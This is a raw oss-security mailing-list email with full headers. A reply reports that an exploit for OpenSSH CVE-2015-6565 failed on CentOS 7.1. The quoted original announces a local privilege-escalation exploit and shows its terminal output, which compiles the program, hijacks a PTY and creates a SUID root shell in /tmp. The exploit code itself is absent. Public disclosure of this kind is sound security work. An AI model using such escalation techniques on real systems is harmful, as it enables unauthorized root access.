X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	["1504" "Thursday" "26" "January" "2017" "18:35:12" "+0100" "Noryungi" "noryungi@gmail.com" "<CAA_Lw39mq10gPSpsFTvCgvug-Ewgjeisj14bDrwvftV-QTeuSg@mail.gmail.com>" "46" "Re: [oss-security] Re: OpenSSH: CVE-2015-6565 (pty issue in 6.8-6.9) can lead to local privesc on Linux" nil nil nil "1" "2017012617:35:12" "[oss-security] Re: OpenSSH: CVE-2015-6565 (pty issue in 6.8-6.9) can lead to local privesc on Linux" (number mark "U       noryungi@gma Jan 26   46/1504  " thread-indent "\"Re: [oss-security] Re: OpenSSH: CVE-2015-6565 (pty issue in 6.8-6.9) can lead to local privesc on Linux\"\n") "<20170126100724.99313jlcg64zbaec@webmail.alunos.dcc.fc.up.pt>" ("<20170126100724.99313jlcg64zbaec@webmail.alunos.dcc.fc.up.pt>") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	nil)
X-Mozilla-Status: 0000
X-Mozilla-Status2: 00000000
Received: (qmail 9248 invoked by uid 550); 26 Jan 2017 20:04:08 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Reply-To: oss-security@lists.openwall.com
Received: (qmail 18021 invoked from network); 26 Jan 2017 17:35:24 -0000
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=gmail.com; s=20161025;
        h=mime-version:in-reply-to:references:from:date:message-id:subject:to;
        bh=oMMQT1xuuYBnXR2ROwOU/kEeHWPluYvxTjIusZd1/XE=;
        b=SYDHCWH3eK/ugkHRHFNFx81XLqr+ZDC9saWQ2eMxJwCSFEqbqOa0gvvz/U5b0Lbs5x
         vROn4oWpK7Vba2h8RwvL7xqdj7Sm1CzJ0qzSomnjYZuFRo3ELpLletOF4q5nRymqRCEO
         XgAXrZCkTcDIpk3cvpo3bBoQMLJqEQx78kPFShni+eX85jOlKg8ryNdgy0Y6kfrZtXPW
         x86bU9f6SteeFpiJ8f66q1I0yb1e7e87VerBEaJwbRq5nHX7ycR32yVm+WXOPx3GyWbF
         yOLGa53tKsPl7tQxDZQEYGc6D27yqM8vXq9+WBohCeug8QpDQlcyMWC4kJBdhQr5VZs3
         inBQ==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20161025;
        h=x-gm-message-state:mime-version:in-reply-to:references:from:date
         :message-id:subject:to;
        bh=oMMQT1xuuYBnXR2ROwOU/kEeHWPluYvxTjIusZd1/XE=;
        b=J8mSOUZdSioVp09JqLG8fstTYPvw7y7RdvK/twNjGlMs6POfQ0/Fw1gKLk9mS9uaBM
         ncARpeaN3JdIhnjagVSInnS01upT8b7ufACkq2GM6SSlSlR4mXcp4QncoxL5RcM51LLe
         X7l4fVTuxlRpJEumfR7cMg81ZGf0aeYXWtwKkhoQWFZFIJm6vtBj4beorjm5DTrFb1Rj
         YKWaXR5MPAyMKsLxij2bTuPCXx8yQvXp6Cb6UVKqNrf26AxJKrkEjjVb/HtAAb/Vp815
         Hp1FbBbL42Ijgw0amIqQLLUvVXQiSHtXFUlRAoMe9vtXSajEdZjzBTCFymdQ0ih7qNIQ
         cr4g==
X-Gm-Message-State: AIkVDXLLS1iukhKoSrLjrsWFG+GFzQPI4Ix+mXhundqgAt5cU+TNFsrUnNqScBBU3CYoarLKy0xs5zVFEzzliA==
X-Received: by 10.159.37.202 with SMTP id 68mr2213238uaf.80.1485452112834;
 Thu, 26 Jan 2017 09:35:12 -0800 (PST)
MIME-Version: 1.0
In-Reply-To: <20170126100724.99313jlcg64zbaec@webmail.alunos.dcc.fc.up.pt>
References: <20170126100724.99313jlcg64zbaec@webmail.alunos.dcc.fc.up.pt>
From: Noryungi <noryungi@gmail.com>
Date: Thu, 26 Jan 2017 18:35:12 +0100
Message-ID: <CAA_Lw39mq10gPSpsFTvCgvug-Ewgjeisj14bDrwvftV-QTeuSg@mail.gmail.com>
To: oss-security@lists.openwall.com
Content-Type: multipart/alternative; boundary=001a1137a4328435e8054702c5ef
Subject: Re: [oss-security] Re: OpenSSH: CVE-2015-6565 (pty issue in 6.8-6.9)
 can lead to local privesc on Linux

--001a1137a4328435e8054702c5ef
Content-Type: text/plain; charset=UTF-8

Does not work on centos 7.1 (unpatched) running stock openssh.

TTY capture works, /tmp/sh is created but user is unprivileged.

On Jan 26, 2017 5:52 PM, <up201407890@alunos.dcc.fc.up.pt> wrote:

> Hi list,
>
> I know I'm late to the party, but I was bored, so I decided to write an
> exploit for CVE-2015-6565 which affects OpenSSH 6.8-6.9
> It is mostly considered to be a "DoS", even though Jann Horn publicly told
> how it could be exploited for local privilege escalation, but I guess its
> either PoC||GTFO for users to update.
>
> From https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-6565
>
> "sshd in OpenSSH 6.8 and 6.9 uses world-writable permissions for TTY
> devices, which allows local users to cause a denial of service (terminal
> disruption) or possibly have unspecified other impact by writing to a
> device, as demonstrated by writing an escape sequence."
>
> I think the description should be updated.
>
> $ gcc not_an_sshnuke.c -o not_an_sshnuke
> $ ./not_an_sshnuke /dev/pts/3
> [*] Waiting for slave device /dev/pts/3
> [+] Got PTY slave /dev/pts/3
> [+] Making PTY slave the controlling terminal
> [+] SUID shell at /tmp/sh
> $ /tmp/sh --norc --noprofile -p
> # id
> euid=0(root) groups=0(root)
>
> Thanks,
> Federico Bento.
>
>
>
> ----------------------------------------------------------------
> This message was sent using IMP, the Internet Messaging Program.
>

--001a1137a4328435e8054702c5ef--
